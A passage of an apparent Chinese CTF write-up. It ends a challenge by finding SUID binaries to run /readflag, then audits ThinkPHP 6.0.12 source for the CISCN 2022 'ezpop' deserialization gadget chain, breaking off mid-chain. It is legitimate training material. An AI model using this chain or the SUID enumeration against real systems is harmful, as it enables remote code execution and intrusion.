<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/readflag</span><br><span class="line">(www-data:/var/www/html) $ ./readflag</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ ./readflag</span><br><span class="line">NSSCTF&#123;d09d2931-3e0b-4a28-8421-660e1df960cc&#125;</span><br></pre></td></tr></table></figure>

<h1 id="137-CISCN-2022-初赛-ezpop"><a href="#137-CISCN-2022-初赛-ezpop" class="headerlink" title="137.[CISCN 2022 初赛]ezpop"></a>137.[CISCN 2022 初赛]ezpop</h1><p><code>www.zip</code>源码泄露，是tp6.0.12LTS框架，可以找通杀，尝试自己代码审计</p>
<p>phpstorm打开源码文件夹<code>ctrl+shift+f</code>全局搜索<code>__destruct</code>，发现<code>vendor\topthink\think-orm\src\Model.php</code>存在以下实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>save()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setAttrs</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;isEmpty()</code>或者<code>false===$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>就会返回false，需要让<code>$this-&gt;isEmpty()</code>为false，<code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>为true才能进入下一段执行，先看后面的trigger，位于<code>\vendor\topthink\think-orm\src\model\concern\ModelEvent.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>([<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>], <span class="variable">$this</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_object</span>(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;model.&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="variable">$this</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让<code>$this-&gt;withEvent</code>为false就可以返回true，再跟进<code>isEmpty()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>empty()</code>中，参数是非空非零的值会返回false，这些变量也会被认为是空：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br><span class="line">int(0)</span><br><span class="line">float(0.0)</span><br><span class="line">&quot;0&quot;</span><br><span class="line">NULL</span><br><span class="line">FALSE</span><br><span class="line">array() //空数组</span><br><span class="line">$var; //未初始化的变量</span><br></pre></td></tr></table></figure>

<p>那就只需要让<code>$this-&gt;data</code>不为空就可以了。跳过了上面的if语句判断，来到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br></pre></td></tr></table></figure>

<p>三元运算符，这里的意思是<code>$this-&gt;exists</code>为true就执行<code>$this-&gt;updateData()</code>，为false执行<code>$this-&gt;insertData($sequence)</code>，<code>$this-&gt;exists</code>是可控的，先跟进<code>updateData()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 事件回调</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">        <span class="comment">// 自动写入更新时间</span></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoWriteTimestamp</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;updateTime] = <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;relationWrite <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模型更新</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">transaction</span>(function () <span class="keyword">use</span> ($<span class="title">data</span>, $<span class="title">allowFields</span>, $<span class="title">db</span>) &#123;</span><br><span class="line">        $<span class="title">this</span>-&gt;<span class="title">key</span> = <span class="title">null</span>;</span><br><span class="line">        <span class="variable">$where</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getWhere</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">strict</span>(<span class="literal">false</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">cache</span>(<span class="literal">true</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">setOption</span>(<span class="string">&#x27;key&#x27;</span>, <span class="variable">$this</span>-&gt;key)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">field</span>(<span class="variable">$allowFields</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkResult</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新回调</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;AfterUpdate&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟刚才绕过<code>trigger</code>一样，第二个if要传入非空的data，是我们控制的，不为空就可以走到<code>$allowFields = $this-&gt;checkAllowFields();</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测字段</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;field = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;schema, <span class="variable">$this</span>-&gt;jsonType));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;field</code>是空的，会执行下面的else分支也就是<code>$this-&gt;db()</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;table)) &#123;</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable">$this</span>-&gt;table . <span class="variable">$this</span>-&gt;suffix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;table</code>可控，能够进入到if里，由于用了<code>.</code>来拼接<code>$this-&gt;table</code>和<code>$this-&gt;suffix</code>，也就是把这两个变量当做字符串来处理，倘若传入对象，则会触发<code>__toString()</code>，因此现在可以寻找<code>__toString()</code>了，在<code>www/vendor/topthink/think-orm/src/model/concern/Conversion.php</code>里的<code>__toString()</code>调用了<code>toJson()</code>，跟进调用了<code>toArray()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">...</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code> $data = array_merge($this-&gt;data, $this-&gt;relation);</code>这一句将两个数组合并，接下来遍历，中间用到<code>getAttr()</code>函数，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRelationAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$relation</code>默认是false的，<code>$value</code>从<code>getData()</code>获取，然后传到<code>getValue()</code>，跟进<code>getData()</code>看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面调用的<code>getRealFieldName</code>跟利用链关系不大，看<code>getValue()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测属性获取器</span></span><br><span class="line">        <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;get)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;get[<span class="variable">$fieldName</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$method</span> = <span class="string">&#x27;get&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$name</span>) . <span class="string">&#x27;Attr&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> 